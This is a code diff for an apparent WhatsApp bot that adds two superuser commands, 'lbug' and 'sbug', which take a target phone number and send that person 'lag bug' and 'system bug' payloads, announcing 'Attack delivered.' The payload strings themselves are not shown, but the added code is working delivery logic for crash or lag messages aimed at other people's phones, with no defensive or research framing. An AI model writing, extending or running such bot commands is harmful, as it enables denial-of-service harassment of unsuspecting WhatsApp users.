@@ -67,6 +67,38 @@ kiubyxmd({
 });
 
 kiubyxmd({
+    pattern: "lbug",
+    category: "owner",
+    description: "Send a lag bug payload to target",
+    filename: __filename
+}, async (from, client, conText) => {
+    const { q, reply, isSuperUser, mek } = conText;
+    if (!isSuperUser) return reply("❌ Restricted to SuperUsers.");
+    if (!q) return reply("🎯 Provide a target JID.");
+
+    const target = q.includes("@") ? q : q + "@s.whatsapp.net";
+    await reply(`🚀 Sending *Level 3 Lag Bug* to ${target}...`);
+    await client.sendMessage(target, { text: payloads.lbug }, { quoted: mek });
+    reply("✅ Attack delivered.");
+});
+
+kiubyxmd({
+    pattern: "sbug",
+    category: "owner",
+    description: "Send a system bug payload to target",
+    filename: __filename
+}, async (from, client, conText) => {
+    const { q, reply, isSuperUser, mek } = conText;
+    if (!isSuperUser) return reply("❌ Restricted to SuperUsers.");
+    if (!q) return reply("🎯 Provide a target JID.");
+
+    const target = q.includes("@") ? q : q + "@s.whatsapp.net";
+    await reply(`🚀 Sending *Level 4 System Bug* to ${target}...`);
+    await client.sendMessage(target, { text: payloads.sbug }, { quoted: mek });
+    reply("✅ Attack delivered.");
+});
+
+kiubyxmd({
     pattern: "bugs",
     aliases: ["bugmenu", "attack"],
     category: "owner",
